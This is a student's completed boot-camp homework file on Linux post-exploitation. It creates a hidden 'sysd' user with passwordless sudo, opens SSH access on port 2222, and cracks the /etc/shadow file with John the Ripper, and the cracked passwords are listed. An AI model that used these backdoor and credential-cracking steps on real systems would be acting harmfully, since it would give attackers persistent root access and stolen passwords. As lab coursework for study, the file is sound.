## Week 6 Homework Submission File: Advanced Bash - Owning the System

Please edit this file by adding the solution commands on the line below the prompt. 

Save and submit the completed file for your homework submission.

**Step 1: Shadow People** 

1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:
    - `Your solution command here` - **_`useradd -rMo -u 600 sysd`_**

2. Give your secret user a password: 
    - `Your solution command here` - **_`passwd sysd`_**

3. Give your secret user a system UID < 1000:
    - `Your solution command here` - **_`usermod -u 600 sysd`_**

4. Give your secret user the same GID:
   - `Your solution command here` - **_`groupmod -g 600 sysd`_**  
   ![System_ID](/Images/sysd.png)

5. Give your secret user full `sudo` access without the need for a password:
   -  `Your solution command here` - **_`visudo sysd ALL=(ALL:ALL) NOPASSWD:ALL`_**


6. Test that `sudo` access works without your password:

   - `Your bash commands here` - **_`cat /etc/sudoers | grep -i sysd | awk '{ print $3 }'`_**  
    ![Root_Access](/Images/sysd-1.png)

**Step 2: Smooth Sailing**

1. Edit the `sshd_config` file:

    `Your bash commands here` - **_`sudo nano /etc/ssh/sshd_config`_**
    
**Step 3: Testing Your Configuration Update**
1. Restart the SSH service:
    - `Your solution command here` - **_`systemctl restart ssh.service`_**  

2. Exit the `root` account:
    - `Your solution command here` - **_`exit`_**  

3. SSH to the target machine using your `sysd` account and port `2222`:
    - `Your solution command here` - **_`ssh sysd@192.168.6.105 -p 2222`_**  

4. Use `sudo` to switch to the root user:  
    - `Your solution command here` - **_`sudo su`_**  

**Step 4: Crack All the Passwords**

1. SSH back to the system using your `sysd` account and port `2222`:

    - `Your solution command here` -  **_`ssh sysd@192.168.6.105 -p 2222`_**  

2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:  
                **_unshadow /etc/passwd /etc/shadow > passwords.txt_** 

    - `Your solution command here` - **_`john passwords.txt`_**
    ```
    Loaded 8 password hashes with 8 different salts (crypt, generic crypt(3) [?/64])
    
    Press 'q' or Ctrl-C to abort, almost any other key for status  
    computer	(stallman)  
    freedom	(babbage)  
    trustno1	(mitnik)  
    dragon	(lovelace)  
    lakers		(turing)  
    passw0rd	(sysadmin)  
    Goodluck!	(student)  
    p4ssw0rd	(sysd)
    ```  

---

© 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.

---
  
## :sunglasses: `Ketan Vithal Patel` :sunglasses:  


### `Friday, April 30, 2021 -- UofT Cybersecurity - Boot Camp`
#### :rose::rose:`Jai Shri Swaminarayan`:rose::rose:
```
હરે કૃષ્ણ હરે કૃષ્ણ, કૃષ્ણ કૃષ્ણ હરે હરે |  Hare Krishna Hare Krishna, Krishna Krishna Hare Hare |
હરે રામ હરે રામ, રામ રામ હરે હરે ||   Hare Ram Hare Ram, Ram Ram Hare Hare ||
```
---  
